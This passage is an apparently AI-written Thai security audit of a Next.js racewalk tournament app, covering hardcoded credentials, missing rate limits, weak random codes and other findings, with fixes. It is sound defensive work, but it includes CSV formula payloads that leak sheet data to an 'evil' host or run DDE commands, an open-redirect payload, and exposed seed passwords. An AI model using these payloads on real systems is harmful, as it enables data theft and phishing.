# รายงานตรวจสอบความปลอดภัย (Security Audit Report)
## Racewalk Tournament

| | |
|---|---|
| **วันที่ตรวจ** | 2026-06-02 |
| **Branch** | `feature/security-audit` |
| **Commit ฐาน** | `1384699` (develop) |
| **ขอบเขต** | ทั้งโปรเจกต์ — auth, authz, crypto, input handling, API/Server Actions, dependencies, config, secrets |
| **ผู้ตรวจ** | Claude (Opus 4.8) — manual code review + automated tooling |
| **Stack** | Next.js 16 (App Router), TypeScript strict, Prisma 7 (MySQL/MariaDB), NextAuth 4, bcrypt, jose |

---

## 1. บทสรุปผู้บริหาร (Executive Summary)

โดยรวมโค้ดเบสนี้ **เขียนได้ดีในเชิงความปลอดภัยพื้นฐาน** — ใช้ Prisma ORM ทั้งหมด (ไม่มี SQL injection), ไม่มี `dangerouslySetInnerHTML`/`eval` (กัน XSS ได้ดีด้วย React escaping), แฮชรหัสผ่านด้วย bcrypt, มี session revocation + activity log ครบ และ **ทุก Server Action มี authorization guard** อย่างสม่ำเสมอ

อย่างไรก็ตามพบประเด็นที่ควรแก้ **24 รายการ** โดยมี **3 High, 9 Medium, 12 Low/Info** จุดที่ต้องรีบจัดการที่สุดคือเรื่อง **credential hygiene** (seed password อ่อน + dev-login credential ฝังใน client bundle + production DB credential ใน `.env` ชี้ public IP), **การไม่มี rate-limit ที่หน้า login** และ **secret code ของกรรมการถูกสร้างด้วย `Math.random()`** (RW-23)

### สรุปจำนวนตามระดับ

| ระดับ | จำนวน | หัวข้อ |
|---|---|---|
| 🔴 **High** | 3 | RW-01 default/hardcoded credentials, RW-02 prod DB secrets + public-IP DB, RW-03 ไม่มี brute-force protection ที่ login |
| 🟠 **Medium** | 9 | RW-04 CSV formula injection, RW-05 open redirect (backslash), RW-06 missing security headers, RW-07 register API ข้าม permission matrix, RW-08 XFF spoofing → rate-limit bypass, RW-09 OAuth dangerous account linking, RW-10 vulnerable dependencies, RW-11 moderator permission ปน read/write, **RW-23 secret code สร้างด้วย Math.random()** |
| 🟡 **Low / Info** | 12 | RW-12 → RW-22, RW-24 (ดูรายละเอียด) |

### เครื่องมือที่ใช้

| เครื่องมือ | สถานะ | ผล |
|---|---|---|
| **Manual code review** | ✅ ครบ | แหล่งของ finding ส่วนใหญ่ |
| **npm audit** | ✅ รัน | 13 advisories (3 high, 10 moderate) |
| **Semgrep** (OWASP/JS/TS/React/secrets, 582 rules) | ✅ รัน 248 ไฟล์ | 0 pattern-finding (มี partial-parse 2 ไฟล์) |
| **SonarQube Community 26.5** (local, Docker) | ✅ รัน | ดูหัวข้อ §5 |
| gitleaks / trufflehog / snyk | ⚠️ ไม่ได้ติดตั้งบนเครื่อง | ทดแทนด้วย `git log`/`git ls-files` ตรวจ secret ใน history แทน |

---

## 2. วิธีการตรวจ (Methodology)

1. **Reconnaissance** — แมปไฟล์ที่เกี่ยวกับความปลอดภัยทั้งหมด (API routes, Server Actions, middleware, auth, crypto, env usage)
2. **Automated SAST** — Semgrep (rulesets: `p/owasp-top-ten`, `p/javascript`, `p/typescript`, `p/react`, `p/secrets`) + SonarQube CE ผ่าน Docker
3. **Dependency audit** — `npm audit`
4. **Secret scanning** — ตรวจ `.env` tracking, git history, hardcoded secrets
5. **Manual deep review** — ไล่ทีละโดเมน: authentication, authorization, session, cryptography, input validation, IDOR, injection, redirects, logging, cookies, CSRF
6. **Verification** — ยืนยัน finding สำคัญด้วยการทดสอบจริง (เช่น open-redirect ทดสอบด้วย Node `new URL()`)

มาตรฐานอ้างอิง: **OWASP Top 10 (2021)** + **CWE**

---

## 3. รายละเอียด Findings ระดับ High

### 🔴 RW-01 — Default/Hardcoded Credentials (seed + dev quick-login)
- **OWASP:** A07 Identification & Authentication Failures · **CWE-798** Use of Hard-coded Credentials, **CWE-1188**
- **ตำแหน่ง:**
  - `prisma/seed.ts:59-85` — seed admin หลายบัญชีด้วยรหัสผ่านที่เดาง่าย เช่น `owner@racewalk.local` / **`owner1234`** ซึ่งเป็น **`isRoot: true`** (root admin), และ `events1234`, `score1234`, `moderator1234`, `reports1234`
  - `components/auth/admin-login-form.tsx:12-13` — `DEV_QUICK_LOGIN_EMAIL = "owner@racewalk.local"` และ `DEV_QUICK_LOGIN_PASSWORD = "owner1234"` เป็น **constant ระดับ module ใน client component (`"use client"`)**

**รายละเอียด:** ค่าคงที่ทั้งสองตัวใน `admin-login-form.tsx` ถูก **compile ติดไปกับ JavaScript bundle ฝั่ง client เสมอ** ไม่ว่า `APP_ENV` จะเป็นค่าใด — ปุ่ม "Quick login for dev" ถูกซ่อนเมื่อ `APP_ENV !== "development"` (`app/admin/(auth)/login/page.tsx:32`) แต่ **ตัว string รหัสผ่านยังอยู่ใน bundle** ใครเปิด DevTools ดู source ก็เห็น

**ผลกระทบ:** ถ้า `prisma db seed` ถูกรันกับฐานข้อมูล production (หรือบัญชี seed หลุดขึ้น prod) จะมี **root admin ที่รหัสผ่านคือ `owner1234`** ซึ่งเปิดเผยอยู่ใน client bundle อยู่แล้ว = backdoor ระดับสูงสุด

**วิธีแก้:**
1. ลบ `DEV_QUICK_LOGIN_PASSWORD`/`DEV_QUICK_LOGIN_EMAIL` ออกจาก client component — ถ้าต้องการ quick-login ใน dev ให้ดึงจาก `process.env.NEXT_PUBLIC_*` ที่ตั้งเฉพาะ dev หรือใช้ค่าที่ไม่ใช่บัญชีจริง
2. seed: ตั้งรหัสผ่านจาก env var ที่ generate แบบสุ่ม หรือบังคับ `force password change` ครั้งแรก และ **ห้ามรัน seed กับ prod** (ใช้ `prisma/init-root-admin.ts` ที่อ่านจาก env แทน — ตัวนั้นทำถูกต้องแล้ว)
3. ตรวจฐาน prod ว่ามีบัญชี `*@racewalk.local` หลงเหลือหรือไม่ ถ้ามีให้ลบ/รีเซ็ตทันที

---

### 🔴 RW-02 — Production Secrets ใน `.env` + ฐานข้อมูลบน Public IP
- **OWASP:** A05 Security Misconfiguration · **CWE-798**, **CWE-200** Exposure of Sensitive Information
- **ตำแหน่ง:** `.env` (ไม่ถูก commit — ดี), `lib/prisma.ts:11-23`

**รายละเอียด:** ไฟล์ `.env` บนเครื่อง dev บรรจุ **credential ของฐานข้อมูล production จริง** โดย `DATABASE_URL` ชี้ไปยัง **public IP `147.50.254.12:3306`** (MySQL เปิดตรงสู่อินเทอร์เน็ต) พร้อม username/password จริง และมี `ROOT_ADMIN_PASSWORD` เก็บแบบ plaintext ด้วย
*(หมายเหตุ: รายงานนี้จงใจไม่พิมพ์ค่า secret ออกมา)*

**สิ่งที่ทำถูกแล้ว:** `.env` ถูก `.gitignore` ครอบ (`.env*`), ไม่พบใน `git log --all`, และ `NEXTAUTH_SECRET` เป็นค่า random 256-bit ที่แข็งแรง ✅

**ผลกระทบ:**
- ถ้าเครื่อง dev ถูกบุกรุก → ได้ credential ฐาน production ทั้งหมด (blast radius สูง)
- MySQL บน public IP port 3306 = attack surface โดยตรง (brute-force, exploit ตัว DB engine) **หากไม่มี firewall/allowlist**

**วิธีแก้:**
1. **อย่าวาง credential ของ production ในเครื่อง dev** — dev ควรใช้ฐานข้อมูล local/staging แยก
2. จำกัดการเข้าถึง MySQL: ปิด public exposure, ใช้ firewall allowlist เฉพาะ IP ของ app server หรือผ่าน SSH tunnel/VPN/private network
3. **หมุน (rotate) credential ฐานข้อมูลและ `ROOT_ADMIN_PASSWORD`** เนื่องจากเคยอยู่ในไฟล์ที่อ่านได้บนเครื่อง dev
4. พิจารณาใช้ secret manager (Vault / cloud secret store) แทน `.env` สำหรับ prod และตั้ง file permission ของ `.env` ให้เข้มงวด (เช่น `chmod 600`)

---

### 🔴 RW-03 — ไม่มี Brute-Force Protection / Rate-Limit ที่ Admin Login
- **OWASP:** A07 · **CWE-307** Improper Restriction of Excessive Authentication Attempts
- **ตำแหน่ง:** `auth.ts:49-92` (CredentialsProvider `authorize`) — ไม่มี rate-limit, ไม่มี account lockout, ไม่มี CAPTCHA

**รายละเอียด:** หน้า login ของ admin ใช้ NextAuth Credentials provider ที่ไม่มีการจำกัดจำนวนครั้งที่พยายาม login ผิด — มีเพียง rate-limit ที่ฝั่ง official join (`app/actions/officials.ts`) เท่านั้น ไม่มีที่ admin login เลย ประกอบกับ password policy ที่ตรวจแค่ความยาว ≥ 8 (`lib/validation.ts`) โดยไม่มี complexity/breached-password check

**ผลกระทบ:** เปิดช่องให้ทำ **credential stuffing / online brute-force** ต่อบัญชี admin (เป้าหมายมีค่าสูงสุดของระบบ) แม้ bcrypt cost 10 จะหน่วงความเร็วได้บ้าง แต่ไม่มีอะไรหยุดการลองซ้ำจำนวนมาก

**วิธีแก้:**
1. เพิ่ม rate-limit ต่อ IP **และ** ต่อ email ที่ `authorize` (เช่นใช้ `lib/rate-limit.ts` หรือ Redis-backed: 5–10 ครั้ง/15 นาที) — แต่ดู RW-08 เรื่อง IP source ด้วย
2. เพิ่ม exponential backoff / temporary lockout หลังพยายามผิดหลายครั้ง
3. พิจารณา CAPTCHA (เดิมเคยมี Turnstile แต่ถูกถอดออก — comment ใน `auth.ts:6` ยืนยัน) สำหรับ login ที่ผิดซ้ำ
4. ยกระดับ password policy: ขั้นต่ำ 12 ตัว + ตรวจกับ breached-password list (เช่น HIBP k-anonymity)

---

## 4. รายละเอียด Findings ระดับ Medium

### 🟠 RW-04 — CSV Formula/Injection ใน Event Export
- **OWASP:** A03 Injection · **CWE-1236** Improper Neutralization of Formula Elements in a CSV File
- **ตำแหน่ง:** `app/api/events/[eventId]/export/route.ts:18-25` (`escapeCsv`), data rows `114-129`

**รายละเอียด:** ฟังก์ชัน `escapeCsv` ครอบ field ด้วย quote เฉพาะเมื่อมี `,` `"` หรือ `\n` เท่านั้น — **ไม่ได้ neutralize อักขระเริ่มสูตร** (`=`, `+`, `-`, `@`, tab, CR) ค่าที่ผู้ใช้ควบคุมได้ (ชื่อนักกีฬา `ra.athlete.name`, ชื่อสังกัด, country, ชื่อ event/round) ถูกเขียนลง CSV ตรง ๆ

**ผลกระทบ:** ถ้านักกีฬาชื่อ `=HYPERLINK("http://evil/"&A1)` หรือ `=cmd|'/c calc'!A1` เมื่อ admin เปิดไฟล์ CSV ใน Excel/Google Sheets สูตรจะถูก execute → ขโมยข้อมูลในชีต, DDE/command execution บนเครื่อง admin
*(หมายเหตุ: ฝั่ง xlsx export `lib/report/summary-xlsx.ts` ปลอดภัย เพราะ ExcelJS เก็บ string เป็น type "text" ไม่ใช่ formula — ตรวจแล้ว)*

**วิธีแก้:** prefix อักขระเสี่ยงด้วย single quote หรือ space ก่อนเขียน CSV:
```ts
function escapeCsv(field: string | number | null | undefined): string {
  if (field === null || field === undefined) return "";
  let s = String(field);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;        // neutralize formula triggers
  if (s.includes(",") || s.includes('"') || s.includes("\n")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
```

---

### 🟠 RW-05 — Open Redirect ผ่าน Backslash ใน Admin Auth Redirect
- **OWASP:** A01 Broken Access Control · **CWE-601** URL Redirection to Untrusted Site
- **ตำแหน่ง:** `lib/admin-auth-redirect.ts:12` (`getSafeAdminRedirect`), ใช้ที่ `proxy.ts:94-96` และ `components/auth/admin-login-form.tsx:45-48`

**รายละเอียด:** `getSafeAdminRedirect` กัน open redirect โดยเช็คว่า callback ต้องขึ้นต้น `/` และ **ไม่ขึ้นต้น `//`** แต่ไม่ได้กัน backslash ตัว WHATWG URL parser จะแปลง `\` เป็น `/` สำหรับ scheme http/https ทำให้ `/\evil.com` กลายเป็น protocol-relative

**ยืนยันแล้ว (ทดสอบจริงด้วย Node):**
```
new URL('/\\evil.com',   'http://localhost:3000') → http://evil.com/
new URL('/\\/evil.com',  'http://localhost:3000') → http://evil.com/
```
payload `/\evil.com` ผ่านการตรวจของ `getSafeAdminRedirect` (ขึ้นต้น `/` ตัวเดียว, ไม่ใช่ `//`) แล้วถูก resolve เป็น origin ภายนอก ทั้งใน middleware (`new URL(...)`) และ client (`window.location.assign(...)`)

**ผลกระทบ:** ส่งลิงก์ `/admin/login?callbackUrl=/\evil.com` ให้ admin ที่ login อยู่ → ถูก redirect ออกไปเว็บภายนอก = phishing / token-theft vector

**วิธีแก้:** validate ด้วย `new URL` + เช็ค origin แทน string check, และ reject backslash:
```ts
export function getSafeAdminRedirect(rawCallback, fallbackPath = "/admin") {
  if (!rawCallback) return fallbackPath;
  const trimmed = rawCallback.trim();
  // reject anything that isn't a clean same-origin path
  if (!trimmed.startsWith("/") || trimmed.startsWith("//") || trimmed.includes("\\")) return fallbackPath;
  if (trimmed === adminLoginPath || trimmed.startsWith(`${adminLoginPath}/`)) return fallbackPath;
  return trimmed;
}
```
และที่ฝั่ง client (`admin-login-form.tsx:47`) ใช้ helper เดียวกันแทน `callbackUrl.startsWith("/")`

---

### 🟠 RW-06 — ขาด HTTP Security Headers
- **OWASP:** A05 Security Misconfiguration · **CWE-693** Protection Mechanism Failure, **CWE-1021** Clickjacking
- **ตำแหน่ง:** `next.config.ts:1-9` — ไม่มี `headers()` config เลย

**รายละเอียด:** ไม่ได้ตั้ง security header ใด ๆ ขาด:
- `Content-Security-Policy` (ลดผลกระทบ XSS)
- `X-Frame-Options` / CSP `frame-ancestors` (กัน clickjacking — admin panel ถูกฝัง iframe ได้)
- `Strict-Transport-Security` (HSTS)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy`, `Permissions-Policy`

**วิธีแก้:** เพิ่มใน `next.config.ts`:
```ts
const securityHeaders = [
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  { key: "Content-Security-Policy", value: "default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'" },
];
const nextConfig: NextConfig = {
  outputFileTracingIncludes: { "/**": ["./node_modules/geothai/**/*"] },
  async headers() { return [{ source: "/:path*", headers: securityHeaders }]; },
};
```
*(CSP ต้องทดสอบกับ Next.js inline scripts — อาจต้องใช้ nonce; เริ่มจาก report-only ได้)*

---

### 🟠 RW-07 — `/api/auth/register` ข้าม Fine-Grained Permission Matrix
- **OWASP:** A01 Broken Access Control · **CWE-285** Improper Authorization
- **ตำแหน่ง:** `app/api/auth/register/route.ts:30-33`

**รายละเอียด:** endpoint ตรวจแค่ `session.user.role !== "ADMIN"` — ไม่ได้เรียก `requirePermission("admins", "create")` แบบที่ Server Action `createAdmin` (`app/actions/admins.ts:37`) ทำ ทำให้ admin ที่ **ไม่ได้รับสิทธิ์ `admins:create`** ในระบบ permission matrix ยังสามารถ POST ตรงไปที่ API นี้เพื่อสร้างบัญชีใหม่ (รวมถึงตั้ง `role: "ADMIN"`) ได้ = เป็นเส้นทางที่อ่อนแอกว่าและขนานกับ UI/Action

**ผลกระทบ:** admin สิทธิ์จำกัดยกระดับสร้าง admin เพิ่มได้ ข้าม access control ที่ออกแบบไว้ (อาจเป็น endpoint legacy ที่ลืมไว้ → attack surface ที่ถูกมองข้าม)

**วิธีแก้:** ใช้ `getCurrentAdmin()` + `hasPermission(me, "admins", "create")` ให้ตรงกับ Server Action หรือถ้าไม่ได้ใช้ endpoint นี้แล้วให้ลบทิ้ง (โค้ดส่วน admin ใช้ `createAdmin` action เป็นหลักอยู่แล้ว)

---

### 🟠 RW-08 — Rate-Limit Bypass + Audit Spoofing ผ่าน `X-Forwarded-For`
- **OWASP:** A07 / A09 · **CWE-348** Use of Less Trusted Source, **CWE-307**
- **ตำแหน่ง:** `lib/request-meta.ts:16-23` (`pickIp`), `app/actions/officials.ts:31-35`, `auth.ts:77-79`

**รายละเอียด:** ระบบเชื่อค่า **ตัวแรก** ของ header `x-forwarded-for` (`fwd.split(",")[0]`) ซึ่งเป็นค่าที่ client ปลอมได้ทั้งหมด rate-limit ของ official join (`join:${ip}:${eventId}`) ก็ key ด้วย IP ตัวนี้ นอกจากนี้ `lib/rate-limit.ts` เป็น in-memory ต่อ process (ใช้ไม่ได้ผลบน serverless/multi-instance)

**ผลกระทบ:**
- attacker หมุนค่า `X-Forwarded-For` ทุก request → **bypass rate-limit 10/นาที** ที่กันการเดา secret code (6 ตัว, charset 32 = ~1.07 พันล้านชุด — ยังใหญ่ แต่ rate-limit แทบไร้ผล)
- ปลอม IP ใน audit log/`UserSession` → กระทบความน่าเชื่อถือของหลักฐาน

**วิธีแก้:**
1. อย่าเชื่อ XFF ตัวแรกแบบไม่มีเงื่อนไข — ถ้าอยู่หลัง reverse proxy/CDN ที่ไว้ใจได้ ให้ใช้ค่าที่ proxy เติม (เช่น `cf-connecting-ip` ของ Cloudflare) หรือ trusted-hop จากขวา ไม่ใช่ซ้ายสุด
2. ตั้งค่า trusted proxy ให้ชัด และ document ว่า deployment ต้องตามนั้น
3. ใช้ rate-limiter ที่ shared (Redis/Upstash) เมื่อ deploy แบบ multi-instance
4. กรณี IP เป็น `"unknown"` (proxy ที่ซ่อน IP) ทุกคนใช้ bucket เดียวกัน — พิจารณา fallback key อื่น

---

### 🟠 RW-09 — Google OAuth `allowDangerousEmailAccountLinking: true`
- **OWASP:** A07 · **CWE-287** Improper Authentication
- **ตำแหน่ง:** `auth.ts:99`

**รายละเอียด:** ตั้ง `allowDangerousEmailAccountLinking: true` ทำให้การ sign-in ด้วย Google ถูก auto-link เข้ากับบัญชีเดิมที่ email ตรงกันโดยอัตโนมัติ ชื่อ option บอกชัดว่า "dangerous" — NextAuth เตือนเพราะถ้า provider ใดให้ email ที่ไม่ verify จะเกิด account takeover ได้ นอกจากนี้ถ้าเปิด Google provider แล้ว ผู้ใช้ Google คนใดก็ sign-in สร้างบัญชี (role USER) ในระบบได้ ซึ่งขัดกับหลัก "admin-invite-only" (แม้ USER จะเข้า `/admin` ไม่ได้)

**ผลกระทบ:** Medium — Google verify email จึงลดความเสี่ยงลง แต่ยังเป็น defense-in-depth ที่ NextAuth แนะนำให้ปิด และการ auto-provision บัญชีเป็น attack surface

**วิธีแก้:** ตั้ง `allowDangerousEmailAccountLinking: false` เว้นแต่มีเหตุผลชัดเจน; ถ้าต้องการ invite-only จริง ให้เพิ่ม allowlist ใน `signIn` callback เพื่อปฏิเสธ email ที่ยังไม่มีในระบบ

---

### 🟠 RW-10 — Dependencies ที่มีช่องโหว่ (npm audit)
- **OWASP:** A06 Vulnerable & Outdated Components · **CWE-1035**
- **ผล `npm audit`:** 13 advisories — **3 high, 10 moderate** (จาก 767 deps)

| Package | ระดับ | ปัญหา | Fix |
|---|---|---|---|
| `flatted` | high | Prototype Pollution + unbounded-recursion DoS ใน `parse()` | ✅ มี |
| `minimatch` | high | ReDoS หลายจุด (wildcards/globstar/extglob) | ✅ มี |
| `picomatch` | high | ReDoS via extglob quantifiers + method injection | ✅ มี |
| `next` | moderate | (runtime) — bump version | ✅ version bump |
| `next-auth` | moderate | (runtime) — bump version | ✅ version bump |
| `postcss` | moderate | XSS via unescaped `</style>` ใน stringify | ✅ |
| `exceljs` | moderate | — | version bump |
| `ajv` | moderate | ReDoS เมื่อใช้ `$data` | ✅ |
| `brace-expansion` | moderate | DoS (zero-step sequence) | ✅ |
| `uuid` | moderate | missing buffer bounds check (v3/v5/v6) | version bump |
| `@hono/node-server`, `@prisma/dev`, `prisma` | moderate | — | version bump |

**ข้อสังเกต:** ตัว high ส่วนใหญ่ (`flatted`/`minimatch`/`picomatch`/`brace-expansion`) เป็น transitive ของ build/lint tooling → ความเสี่ยง runtime จริงต่ำ แต่ `next` + `next-auth` เป็น runtime ของ auth flow ควรอัปเดตก่อน

**วิธีแก้:**
```bash
npm audit fix          # แก้ที่ไม่ breaking ก่อน
npm audit fix --force   # เฉพาะเมื่อตรวจ breaking change แล้ว (next/next-auth major)
```
ตั้ง `npm audit` (หรือ Dependabot/Renovate) ใน CI

---

### 🟠 RW-11 — Moderator Permission ปน Read กับ Write (Least Privilege)
- **OWASP:** A01 / A04 Insecure Design · **CWE-272** Least Privilege Violation
- **ตำแหน่ง:** `app/actions/moderator.ts:14-16` + `lib/permissions.ts:47` (`moderator: ["view"]`)

**รายละเอียด:** moderator action ทั้ง 12 ตัว (ลบใบ, ยืนยัน/ปฏิเสธใบแดง, DQ นักกีฬา, แก้เวลา/อันดับ/ข้อมูลรอบ) ใช้ guard เดียวกันคือ `requirePermission("moderator", "view")` และ resource `moderator` มี action เดียวคือ `"view"` ดังนั้น **สิทธิ์ที่ชื่อ "ดู" (view) กลับทำการเขียน/ลบ/แก้ผลการแข่งขันได้ทั้งหมด**

**ผลกระทบ:** สำหรับระบบแข่งกีฬา **การแก้ผลการแข่งคือภัยคุกคามอันดับหนึ่ง** การที่สิทธิ์ชื่อ read-only ให้อำนาจ write เต็มที่ทำให้การมอบสิทธิ์ผิดพลาดได้ง่าย และผิดหลัก least privilege (แม้ทุก action จะถูก audit log ครบ ซึ่งช่วยตรวจสอบย้อนหลังได้)

**วิธีแก้:** แยกสิทธิ์ moderator ออกเป็น view (ดู) กับ control/edit (แก้) หรืออย่างน้อย rename ให้ชัด (เช่น `moderator: ["control"]`) เพื่อไม่ให้สับสนว่าเป็น read-only

---

### 🟠 RW-23 — Secret Code สร้างด้วย `Math.random()` (Weak PRNG) ฝั่ง Client
- **OWASP:** A02 Cryptographic Failures · **CWE-338** Use of Cryptographically Weak PRNG, **CWE-330**
- **ตำแหน่ง:** `components/rounds/round-form.tsx:83-89` (`generateSecretCode`); persist ที่ `app/actions/rounds.ts:141,231` (server เก็บ `secretCode` ที่ client ส่งมาตรง ๆ ไม่ได้ generate เอง)
- **พบโดย:** SonarQube hotspot (`round-form.tsx:86`) + ยืนยันด้วย manual review

**รายละเอียด:** secret code 6 ตัว ซึ่งเป็น **credential เดียว** ที่กรรมการ / หัวหน้ากรรมการ / ผู้เก็บเวลา ใช้เข้า workspace เพื่อออก-แก้ใบ, บันทึกเวลา, DQ นักกีฬา — ถูกสร้างด้วย `Math.random()` ในเบราว์เซอร์ของ admin แล้วส่งให้ server เก็บตรง ๆ `Math.random()` **ไม่ใช่ CSPRNG** (V8 ใช้ xorshift128+ ที่คาดเดา/กู้สถานะได้)

**ผลกระทบ:** code ของ official ทุกคนในรอบเดียวกันถูก gen จาก RNG stream เดียวกันต่อเนื่อง — ผู้ที่ได้ code ของตัวเองโดยชอบ (เช่นกรรมการธรรมดา) มีโอกาส **คาดเดา code ของหัวหน้ากรรมการ/ผู้เก็บเวลาในรอบเดียวกัน** เพื่อยกระดับสิทธิ์ เมื่อรวมกับ rate-limit ที่ bypass ได้ (RW-08) และเก็บ plaintext (RW-13) ระบบ secret code จึงอ่อนหลายชั้น

**วิธีแก้:** ย้ายการสร้าง code ไปฝั่ง **server** ด้วย CSPRNG และห้ามเชื่อค่าจาก client:
```ts
import { randomInt } from "crypto";
const SECRET_CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
export function generateSecretCode(): string {
  let code = "";
  for (let i = 0; i < 6; i++) code += SECRET_CHARS[randomInt(SECRET_CHARS.length)];
  return code;
}
```
ให้ `createRound`/`updateRound` (`rounds.ts`) สร้าง code เองฝั่ง server (ไม่รับ `secretCode` จาก client — ฝั่ง client แสดงเป็น preview หลังบันทึกเท่านั้น) และพิจารณาเพิ่มความยาวเป็น 8 ตัวเพื่อเพิ่ม entropy

---

## 5. ผลจาก Automated Scanners

### Semgrep
สแกน **248 ไฟล์ ด้วย 582 rules** (OWASP/JS/TS/React/secrets) → **0 pattern-finding**, parse error 3 รายการ (ตัว `semgrep-results.json` เอง + partial-parse 2 ไฟล์ `.tsx` ที่มี syntax ใหม่ที่ semgrep parse ไม่ครบ: `app/admin/(pages)/events/[eventId]/report/summary/page.tsx`, `components/moderator/moderator-edit-view.tsx`)

การที่ 0 finding สอดคล้องกับผลรีวิว manual — ไม่มี anti-pattern แบบ `eval`, `dangerouslySetInnerHTML`, raw SQL, hardcoded secret ที่ตรง rule (หมายเหตุ: secret ruleset ไม่ได้สแกน `.env` ในรอบนี้ และไม่จับ generic string อย่าง `owner1234`) — finding ที่มีค่ามาจาก manual review ทั้งหมด

### SonarQube Community 26.5 (local Docker)

วิเคราะห์ **22,687 บรรทัด (ncloc)** — CE task: **SUCCESS**

| Metric | ค่า |
|---|---|
| Security Rating | **C (3.0)** |
| Reliability Rating | **D (4.0)** |
| Maintainability (SQALE) | A (1.0) |
| Vulnerabilities | 11 |
| Security Hotspots | 2 |
| Bugs | 15 |
| Code Smells | 371 |
| Issues รวม | 397 (25 critical, 167 major, 205 minor) |

**Vulnerabilities (rule `S2068` "hard-coded password") — 11 จุด:**
- **6 จุด = ของจริง → ยืนยัน RW-01** : `components/auth/admin-login-form.tsx:13`, `prisma/seed.ts:59,61,69,78,82`
- **ที่เหลือ = false positive** : string ที่มีคำว่า "password" ใน enum/label — `lib/activity-log.ts:16-17` (`USER_PASSWORD_*`), `lib/activity-log-labels.ts:9-10`
- → SonarQube จับ hardcoded credential ชุดเดียวกับ manual review = **ยืนยันความรุนแรงของ RW-01** ด้วยเครื่องมืออิสระ

**Security Hotspots — 2 จุด (ทั้งคู่ตรงกับ finding ที่รายงาน):**
1. `lib/validation.ts:10` — email regex อาจเสี่ยง ReDoS → **RW-24**
2. `components/rounds/round-form.tsx:86` — `Math.random()` สร้าง secret code → **RW-23**

**Bugs (15):** ส่วนใหญ่เป็น `S2871` (`Array.sort()` ไม่มี compare function → ภาษาไทยเรียงผิดเพี้ยนในตารางนักกีฬา/กรรมการ/admin) และ `S3923`/`S5256` — เป็น **correctness/quality ไม่ใช่ security** แต่ S2871 ควรแก้เพราะกระทบการแสดงผลจริง

---

## 6. รายละเอียด Findings ระดับ Low / Info

### 🟡 RW-12 — Official (race-day) Session ไม่มี Server-Side Revocation
- **CWE-613** Insufficient Session Expiration · `lib/official-jwt.ts`, `proxy.ts:54-72`
- official session เป็น JWT แบบ stateless (ไม่เช็ค DB) + sliding ทุก request (workspace poll 5–15s) → **session แทบไม่หมดอายุตราบที่แท็บเปิดอยู่** และ **ไม่มีทาง revoke** กลางคัน ถ้า secret code รั่ว/ถอดกรรมการออกจากรอบ cookie เดิมยังใช้ได้อีกถึง 12 ชม.
- **แก้:** เก็บ session id ลง DB แล้วเช็ค revoke ใน `verifyOfficialSession`/slide, หรือ bind session กับ `round.status` (จบรอบ = invalidate), เพิ่มปุ่ม "เตะ official" ใน moderator

### 🟡 RW-13 — Secret Code เก็บแบบ Plaintext
- **CWE-256** · `prisma/schema.prisma:378` (`RoundOfficial.secretCode`), `app/actions/officials.ts:45`
- รหัสเข้าร่วม 6 ตัวเก็บ plaintext + เทียบด้วย DB equality (ไม่ constant-time) — DB อ่าน/backup รั่ว = ได้รหัสที่ใช้งานอยู่ทั้งหมด
- **แก้:** ยอมรับได้สำหรับรหัสอายุสั้นระดับ race-day แต่ถ้าต้องการเข้ม ให้ hash หรือจำกัดอายุตามรอบ + audit การใช้รหัส

### 🟡 RW-14 — User Enumeration ผ่าน Login Timing
- **CWE-203** · `auth.ts:65-67`
- ถ้า email ไม่มีในระบบจะ `return null` ทันที (ไม่รัน bcrypt) แต่ถ้ามีจะรัน `bcrypt.compare` (ช้ากว่า) → วัด timing แยก email จริง/ปลอมได้
- **แก้:** รัน dummy `bcrypt.compare` กับ hash คงที่เมื่อไม่พบ user เพื่อให้เวลาใกล้เคียงกัน

### 🟡 RW-15 — official-jwt ไม่ Pin Algorithm + ไม่ Validate `position` enum
- **CWE-347** · `lib/official-jwt.ts:43,58`
- `jwtVerify(token, getKey())` ไม่ระบุ `algorithms: ["HS256"]` (มี key แบบ symmetric ช่วยจำกัดให้เป็น HS* อยู่แล้ว — ความเสี่ยงต่ำ) และ cast `position` เป็น enum โดยเช็คแค่ `typeof === "string"` ไม่เทียบกับค่าที่อนุญาต
- **แก้:** เพิ่ม `{ algorithms: ["HS256"] }` และ validate `position ∈ {JUDGE, HEAD_JUDGE, EVENT_LOGGER}`

### 🟡 RW-16 — `NEXTAUTH_SECRET` ถูกใช้ร่วมสองระบบ token
- **CWE-1270 (key reuse)** · `lib/official-jwt.ts:26` ใช้ secret เดียวกับ NextAuth JWE
- ต่างอัลกอริทึม (NextAuth = JWE/HKDF, official = HMAC) จึงไม่มี cross-protocol attack ตรง ๆ แต่ผิดหลัก key separation
- **แก้:** ใช้ secret แยกสำหรับ official-jwt (เช่น `OFFICIAL_SESSION_SECRET`)

### 🟡 RW-17 — Password Policy อ่อน (ตรวจแค่ความยาว)
- **CWE-521** · `lib/validation.ts:20-28` — ขั้นต่ำ 8 ตัว ไม่มี complexity/breach check (ดู RW-03)

### 🟡 RW-18 — bcrypt Cost ไม่สม่ำเสมอ (10 vs 12)
- `auth`/`admins`/`register`/`profile` ใช้ cost 10, `init-root-admin.ts:15` ใช้ 12 — แนะนำตั้งค่ากลาง (เช่น 12) ผ่าน constant เดียว

### 🟡 RW-19 — `moderatorEditCard` รับ `judgeId` ตรงจาก client โดยไม่ validate
- **CWE-20** · `app/actions/moderator.ts:519-528` — set `judgeId: data.judgeId` โดยไม่ตรวจว่า judge อยู่ใน round/event นั้น (data-integrity; admin-only + audited จึงความเสี่ยงต่ำ)
- **แก้:** ตรวจว่า `judgeId` เป็น official ของ round ก่อน update

### 🟡 RW-20 — Middleware เชื่อ Role จาก JWT โดยไม่เช็ค DB (Defense-in-Depth)
